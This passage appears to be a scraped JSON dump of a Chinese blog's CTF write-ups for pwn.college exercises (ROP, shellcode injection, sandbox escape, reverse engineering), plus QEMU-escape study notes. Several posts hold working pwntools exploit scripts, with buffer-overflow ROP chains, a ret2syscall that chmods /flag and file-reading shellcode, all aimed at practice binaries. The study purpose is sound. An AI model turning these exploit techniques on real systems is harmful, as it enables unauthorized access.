data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>「前面不太记得了，从level3记起」</p>\n<h3><span id=\"level3\">level3</span></h3><p><code>./embryoio_level3  xkbdyoisnx</code>    </p>\n<h4><span id=\"level4\">Level4</span></h4><p><code>export jouixn = xxx</code></p>\n<h4><span id=\"level5\">Level5</span></h4><p>​    一个标准输入重定向的考察，</p>\n<p><code>./embryoio_level5 &lt; /tmp/mihsjr</code></p>\n<p>​        还需要编辑<code>mihsjr</code>的内容为给的密码。</p>\n<h4><span id=\"level6\">Level6</span></h4><p>​        一个输出重定向，创建对应文件<code>./embryoio_level6 &gt; /tmp/ptyaid</code>，flag在<code>ptyaid</code>中。</p>\n<h4><span id=\"level7\">Level7</span></h4><p><code>env -i ./xxx</code></p>\n<h4><span id=\"level8\">Level8</span></h4><p>​        写个sh脚本，内容是打开这个题目。注意路径。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hacker@embryoio_level8:~$ cat my_script.sh </span><br><span class=\"line\">/challenge/embryoio_level8</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level9\">Level9</span></h4><p>​        与level8同理，顺手输个密码就行。</p>\n<h4><span id=\"level10\">Level10</span></h4><p>​        同level3</p>\n<h4><span id=\"level11\">Level11</span></h4><p>​        同level4。</p>\n<h4><span id=\"level12\">Level12</span></h4><p>​        同level5</p>\n<h4><span id=\"level13\">Level13</span></h4><p>​        同level6</p>\n<h4><span id=\"level14\">Level14</span></h4><p>​        同level7</p>\n<h4><span id=\"level15\">Level15</span></h4><p>​        一言难尽，可以在ipython里用pwntools。</p>\n<h4><span id=\"level16\">Level16</span></h4><p>​        同15。</p>\n<h4><span id=\"level17\">Level17</span></h4><p>​        这几个level就是将python与之前level的命令行参数或者环境变量结合，虽然难度不高但是很考验pwntools运用的熟练度。所以我还没有找到做出来的方法。</p>\n<h4><span id=\"level18\">Level18</span></h4><p>​        利用python设置环境变量，主要利用到<code>os.environ</code>或者<code>os.putenv</code>函数。</p>\n<h4><span id=\"level19\">Level19</span></h4><p>​</p>\n","categories":["Binary_security"],"tags":["pwncollege"]},{"title":"ROP","url":"/2022/03/10/pwn.college_ROP/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-Leydzrvf\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>写在前面：如果是普通的环境，运行程序可能需要<code>capstone</code>，可以直接在官网下载源码编译，然后将编译好的动态链接库cp到lib里</p>\n<p><code>cp libcapstone.so.5 /lib/x86_64-linux-gnu/</code></p>\n<h4><span id=\"level1\">Level1</span></h4><p>​        最最最基础的rop了，和前前一个module的前面的有个level一模一样。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babyrop_level1.0&quot;</span>)</span><br><span class=\"line\">win = <span class=\"number\">0x401b56</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> + p64(win)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level2\">Level2</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babyrop_level2.0&quot;</span>)</span><br><span class=\"line\">win1 = <span class=\"number\">0x4022EE</span></span><br><span class=\"line\">win2 = <span class=\"number\">0x40239B</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">88</span> + p64(win1) + p64(win2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level3\">Level3</span></h4><p>​        从这个level差不多沾了一些rop的边了，需要利用<code>ROPgadget</code>来寻找对应的gadget</p>\n<p>​        </p>\n <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babyrop_level3.0&quot;</span>)</span><br><span class=\"line\">win1 = <span class=\"number\">0x40275A</span></span><br><span class=\"line\">win2 = <span class=\"number\">0x402836</span></span><br><span class=\"line\">win3 = <span class=\"number\">0x402678</span></span><br><span class=\"line\">win4 = <span class=\"number\">0x402592</span></span><br><span class=\"line\">win5 = <span class=\"number\">0x402916</span></span><br><span class=\"line\"></span><br><span class=\"line\">rdi = <span class=\"number\">0x402d03</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">72</span>  </span><br><span class=\"line\">payload += p64(rdi) + p64(<span class=\"number\">1</span>) + p64(win1)</span><br><span class=\"line\">payload += p64(rdi) + p64(<span class=\"number\">2</span>) + p64(win2)</span><br><span class=\"line\">payload += p64(rdi) + p64(<span class=\"number\">3</span>) + p64(win3)</span><br><span class=\"line\">payload += p64(rdi) + p64(<span class=\"number\">4</span>) + p64(win4)</span><br><span class=\"line\">payload += p64(rdi) + p64(<span class=\"number\">5</span>) + p64(win5)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​    </p>\n<h4><span id=\"level4\">Level4</span></h4><p>​        </p>\n<p>​        rop，ret2syscall。</p>\n<p>​        这道题其实方法有很多，但是由于栈的空间相对比较小，所以官方给出的做法反而是最聪明也是最实际的。</p>\n<p>（因为如果要orw或者getshell的话似乎还要栈迁移）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">process.write(<span class=\"string\">b&#x27;/flag\\0&#x27;</span>.ljust(<span class=\"number\">88</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + pwn.p64(pop_rax.address)+pwn.p64(<span class=\"number\">90</span>) + pwn.p64(pop_rdi.address)+pwn.p64(<span class=\"built_in\">input</span>) </span><br><span class=\"line\">    ...: + pwn.p64(pop_rsi.address) + pwn.p64(<span class=\"number\">0o777</span>) + pwn.p64(syscall.address))</span><br></pre></td></tr></table></figure>\n<p>我魔怔了</p>\n<p>顺便附一个拿input地址有问题的exp（其实我怀疑gadget的地址也有问题，但是懒得改了）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./babyrop_level4.0&quot;</span>)</span><br><span class=\"line\">syscall = <span class=\"number\">0x401a69</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x401492</span></span><br><span class=\"line\">pop_rax_ret = <span class=\"number\">0x401a91</span></span><br><span class=\"line\">pop_rsi_ret = <span class=\"number\">0x401a71</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;[LEAK] Your input buffer is located at: &quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">input</span>  = u64(p.recv()[:<span class=\"number\">12</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">input</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;/flag\\0&quot;</span>.ljust(<span class=\"number\">88</span>,<span class=\"string\">b&#x27;a&#x27;</span>)  </span><br><span class=\"line\">payload += p64(pop_rax_ret) + p64(<span class=\"number\">90</span>)</span><br><span class=\"line\">payload += p64(pop_rdi_ret) + p64(<span class=\"built_in\">input</span>)</span><br><span class=\"line\">payload += p64(pop_rsi_ret) + p64(<span class=\"number\">0o777</span>)</span><br><span class=\"line\">payload += p64(syscall)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level5\">level5</span></h4><p>​        这个题也蛮魔怔，和上一个level没有什么区别，但是没有print input buffer，对于我来说也差不多，但是就相对更麻烦了。</p>\n<p>​</p>\n","categories":["PWN.COLLEGE"],"tags":["pwncollege"]},{"title":"ReverseEngineering","url":"/2022/02/15/pwn.college_ReverseEngineering/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-BLGFDoLm\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h4><span id=\"level10\">Level1.0</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8A%E5%8D%884.12.04.png\" alt=\"截屏2022-02-15 上午4.12.04\"></p>\n<h4><span id=\"level11\">Level1.1</span></h4><p>​        同上，一样的做法。</p>\n<h4><span id=\"level20\">Level2.0</span></h4><p>​        交换idx3和idx4的位置</p>\n<h4><span id=\"level21\">Level2.1</span></h4><p>​        交换idx1和idx4.</p>\n<p>​        ps：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%883.28.51.png\" alt=\"截屏2022-02-15 下午3.28.51\"></p>\n<p>​        输入五个字符，转化为ascii后以int类型贮存，从栈布局可以看出v10大小是4个字，所以第五个字被储存在v11。</p>\n<h4><span id=\"level30\">Level3.0</span></h4><p>​        reverse</p>\n<h4><span id=\"level31\">Level3.1</span></h4><p>​        同上。</p>\n<h4><span id=\"level40\">Level4.0</span></h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">3</span>; ++j )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">for</span> ( k = <span class=\"number\">0</span>; k &lt; <span class=\"number\">4</span> - j; ++k )</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ( *((_BYTE *)&amp;v15 + k - <span class=\"number\">14</span>) &gt; *((_BYTE *)&amp;v15 + k - <span class=\"number\">13</span>) )</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">       v4 = *((_BYTE *)&amp;v15 + k - <span class=\"number\">14</span>);</span><br><span class=\"line\">       *((_BYTE *)&amp;v15 + k - <span class=\"number\">14</span>) = *((_BYTE *)&amp;v15 + k - <span class=\"number\">13</span>);</span><br><span class=\"line\">       *((_BYTE *)&amp;v15 + k - <span class=\"number\">13</span>) = v4;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>​        一个简单的冒泡排序算法。</p>\n<h4><span id=\"level41\">level4.1</span></h4><p>​        同上</p>\n<h4><span id=\"level50\">Level5.0</span></h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">4</span>; ++j )</span><br><span class=\"line\">   *((_BYTE *)&amp;v13 + j - <span class=\"number\">14</span>) ^= <span class=\"number\">0xCD</span>u;</span><br></pre></td></tr></table></figure>\n<p>​        异或加密，需要用到简单的脚本（手抠也不是不行）</p>\n<h4><span id=\"level51\">Level5.1</span></h4><p>​        同上，好饿。</p>\n<h4><span id=\"level60\">Level6.0</span></h4><p>​        可以批量导出数据，避免手动处理数组</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%885.15.04.png\" alt=\"截屏2022-02-15 下午5.15.04\"></p>\n<p>​        程序的逻辑是输入的字符串进行降序排序-&gt;条件异或，我们需要通过结果反推输入值，</p>\n<p>​        因为程序一定会对字符串进行降序排序，所以输入字符串的顺序其实意义不大，无论是怎么打乱，最后处理的结果都是一样的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x = [<span class=\"number\">0x64</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x60</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x7F</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x77</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0x77</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x73</span>, <span class=\"number\">0x4B</span>, <span class=\"number\">0x71</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i % <span class=\"number\">2</span>  == <span class=\"number\">0</span>):</span><br><span class=\"line\">        x[i] ^= <span class=\"number\">0x10</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">      x[i] ^= <span class=\"number\">0x29</span></span><br><span class=\"line\"></span><br><span class=\"line\">    a = <span class=\"built_in\">chr</span>(x[i])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(a)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["pwncollege"]},{"title":"Sandboxing","url":"/2022/02/28/pwn.college_Sandboxing/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-ZRtMpegx\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h4><span id=\"level1\">Level1</span></h4><p>​        首先考察<code>chroot</code></p>\n<p>​        因为程序在将根目录设置为<code>/jail</code>的时候并没有切换当前工作目录为<code>/jail</code>，所以我们实际上还是在<code>/</code>目录，因此可以直接通过<code>argv[1]</code>    读取flag。</p>\n<p>​        执行脚本的时候需要添加<code>cwd</code>参数，使其工作目录为<code>/</code></p>\n<h4><span id=\"level2\">Level2</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">shellcode = asm(shellcraft.readfile(<span class=\"string\">&#x27;flag&#x27;</span>,<span class=\"number\">1</span>))</span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/challenge/babyjail_level2&quot;</span>, <span class=\"string\">&quot;/&quot;</span>],cwd=<span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\">p.send(shellcode)</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level3\">Level3</span></h4><p>​            关键源码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">assert(argc &gt; <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Checking to make sure you&#x27;re not trying to open the flag.\\n&quot;</span>);</span><br><span class=\"line\">   assert(<span class=\"built_in\">strstr</span>(argv[<span class=\"number\">1</span>], <span class=\"string\">&quot;flag&quot;</span>) == <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">int</span> fd = open(argv[<span class=\"number\">1</span>], O_RDONLY|O_NOFOLLOW);</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">       <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Failed to open the file located at `%s`.\\n&quot;</span>, argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">   <span class=\"keyword\">else</span></span><br><span class=\"line\">       <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Successfully opened the file located at `%s`.\\n&quot;</span>, argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">char</span> jail_path[] = <span class=\"string\">&quot;/tmp/jail-XXXXXX&quot;</span>;</span><br><span class=\"line\">   assert(mkdtemp(jail_path) != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Creating a jail at `%s`.\\n&quot;</span>, jail_path);</span><br><span class=\"line\"></span><br><span class=\"line\">   assert(chroot(jail_path) == <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Moving the current working directory into the jail.\\n&quot;</span>);</span><br><span class=\"line\">   assert(chdir(<span class=\"string\">&quot;/&quot;</span>) == <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">int</span> fffd = open(<span class=\"string\">&quot;/flag&quot;</span>, O_WRONLY | O_CREAT);</span><br><span class=\"line\">   write(fffd, <span class=\"string\">&quot;FLAG&#123;FAKE&#125;&quot;</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">   close(fffd);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["pwncollege"]},{"title":"Shellcode_Injection","url":"/2022/01/29/pwn.college_Shellcode_Injection/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-diFEZMbn\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>​        整个专题其实就是一个shellcode编写的小练习，并不需要自己寻找漏洞点，写好shellcode直接注入就行。</p>\n<p>​        如果要将服务器的文件传输到本地的话可以使用:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">scp -i key -r hacker@dojo.pwn.college:/challenge [本地路径]</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level1\">Level1</span></h4><p>​        可以用pwntools的shellcraft模块，但是也可以手写shellcode。</p>\n<p>​        这道题可以用简单的orw的思路做。但是shellcode的地址需要在规定的地方。至于为什么，可能只有这一块可写可读？</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">shellcode = shellcraft.amd64.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;/flag&quot;</span>)\t\t</span><br><span class=\"line\">shellcode += shellcraft.amd64.read(<span class=\"string\">&#x27;rax&#x27;</span>, addr + <span class=\"number\">0x100</span>, <span class=\"number\">0x100</span>)</span><br><span class=\"line\">shellcode += shellcraft.amd64.write(<span class=\"number\">1</span>, addr + <span class=\"number\">0x100</span>, <span class=\"number\">0x100</span>)</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level2\">Level2</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">shellcode = shellcraft.amd64.nop()*<span class=\"number\">0x800</span></span><br><span class=\"line\">shellcode = shellcraft.amd64.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;/flag&quot;</span>)\t\t</span><br><span class=\"line\">shellcode += shellcraft.amd64.read(<span class=\"string\">&#x27;rax&#x27;</span>, stack + <span class=\"number\">0x100</span>, <span class=\"number\">0x100</span>)</span><br><span class=\"line\">shellcode += shellcraft.amd64.write(<span class=\"number\">1</span>, stack + <span class=\"number\">0x100</span>, <span class=\"number\">0x100</span>)</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level3\">Level3</span></h4><p>​        还是和第一个差不多。</p>\n<h4><span id=\"level4\">Level4</span></h4><p>​        shellcode不能含有”H”。</p>\n<p>​        第一个想到的就是不能含有<code>push</code>，其他指令似乎也没有h了。想要完成的话第一个思路是手写不含push的shellcode，另外一个思路是构造跳板读取其他位置的shellcode（这种思路其实比较常见并且配套的视频中也提到过）</p>\n<p>​        但是实际做题体验极差，写了read()后，读取的shellcode无论怎样都无法读到flag，明明已经getshell了，也没有eof，但是就是没办法。以后再想吧。</p>\n<p>​        </p>\n<h4><span id=\"level5\">Level5</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-18%20%E4%B8%8B%E5%8D%8810.02.44.png\" alt=\"截屏2022-02-18 下午10.02.44\"></p>\n<p>​        需要让shellcode在运行时生成<code>syscall()</code>。</p>\n<p>​        之前我是没有思路的，但是后面看到一个师傅对于shellcode的总结里提到对于shellcode的过滤中有禁止系统调用命令这个类别，也就是其实只要输入可见字符串就好了。关于这一点，比较方便的就是利用可见字符shellcode生成工具，比较牛逼的可以利用对应指令集手写。也就是</p>\n<p><code>int 0x80 ; syscall</code>通过<code>xor sub and inc dec</code>运算来操作。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["pwncollege"]},{"title":"再识qemu","url":"/2022/12/15/qemu_qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-PHRFtJBg\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h2><span id=\"0\">0</span></h2><p>​        曾经对qemu有过浅显的了解，然而当我尝试复现并分析cve-2020-14364的时候发现我对于qemu的那点贫瘠的知识完全无法支撑我完成“复现”这一步，虽然复杂的环境搭建和exp中各种各样的问题也是导致复现失败的因素。这篇文章的目的是让我对于qemu有一个更加全面而且深入的了解，最终它能够驱使我再一次打开cve-2020-14364的文件夹，面对一片狼藉的环境完成最后的文档。</p>\n<h2><span id=\"1-qemu内存\">1 qemu内存</span></h2><p>​        既然文章的主题是“qemu逃逸”，那么就必须知道qemu中内存分布与宿主机中内存分布的区别，并且知悉这两种地址是如何做到相互转换的，唯有清楚了其中的规则，才能实现一系列类似地址泄露的操作。</p>\n<p>​        这里参考的是<a href=\"https://xz.aliyun.com/t/6562\">https://xz.aliyun.com/t/6562</a></p>\n<p>​        首先回答几个简单的问题。</p>\n<ol>\n<li>qemu虚拟机中的内存是怎么来的？—mmap分配出的对应大小内存。</li>\n<li>qemu中申请的内存如何在宿主机的内存空间中找到？—首先将qemu虚拟机中的基地址转换为宿主机中的物理地址，再用qemu中线程分配的偏移加上这个物理地址。</li>\n</ol>\n<h2><span id=\"pci设备\">pci设备</span></h2><p>​        基本上每一个qemu逃逸入门的文章都会从pci设备讲起，探其原因，无非是qemu逃逸的突破口多为含有漏洞的pci设备驱动程序，而我们想要找到漏洞，并成功利用，就必须要了解这个设备的一些基本性质。</p>\n<h3><span id=\"何为pci设备\">何为pci设备</span></h3><p>即符合PCI 总线标准的设备。</p>\n<h2><span id=\"参考\">参考</span></h2><p><a href=\"http://tianyu-code.top/Linux内核/PCI介绍/\">http://tianyu-code.top/Linux内核/PCI介绍/</a></p>\n<p><a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/\">https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/</a></p>\n","categories":["Binary_security"],"tags":["qemu"]},{"title":"攻防世界-Play","url":"/2022/10/31/race_condition_%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Play/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-AtYQtsUZ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>       \n<p>​        做一下条件竞争的题。</p>\n<p>​        话说第一次遇见条件竞争还是在一个不记得名字的比赛中有一个夹带asoul的叫做红色高跟鞋的题，虽然珈乐已经毕业，但是这个题给我的印象还是很深。</p>\n<h2><span id=\"re\">re</span></h2><p>​    <code>attack</code>函数中有一个栈溢出，但是只有monster的血量小于等于0时才能执行，并且这个debuff还得是3.</p>\n<p>​    先看怎么让monster血量清零。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//&#x27;attack:42&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( hero_skill_2 &lt; mon_skill_1 )</span><br><span class=\"line\">    gHero-&gt;surplus -= mon_skill_1 - hero_skill_2;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( mon_skill_2 &lt; hero_skill_1 )</span><br><span class=\"line\">    gMonster-&gt;surplus -= hero_skill_1 - mon_skill_2;</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        可以看到如果这个隐藏技能的技能点高于怪兽技能，就能够伤害怪兽。每打败一次怪兽就debuff提升一点。</p>\n<p>​        </p>\n<p>​        逆得睡着了zzzzzzz。</p>\n<p>​        再来看<code>init_new_db_file(char *file)</code>这个函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">init_new_db_file</span><span class=\"params\">(<span class=\"keyword\">char</span> *file)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> fd; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  fd = open(file, <span class=\"number\">66</span>, <span class=\"number\">438</span>);                     <span class=\"comment\">// open &quot;name&quot;</span></span><br><span class=\"line\">  gHero = (struct_gHero *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x54</span>u);        <span class=\"comment\">// create gHero </span></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(gHero, <span class=\"number\">0</span>, <span class=\"number\">0x54</span>u);                      <span class=\"comment\">// init gHero</span></span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>((<span class=\"keyword\">char</span> *)&amp;gHero[<span class=\"number\">1</span>], file);              <span class=\"comment\">// copy the input &quot;name&quot; to the hero name</span></span><br><span class=\"line\">  gHero[<span class=\"number\">5</span>].kill_type = &amp;g_hero_kill_type;       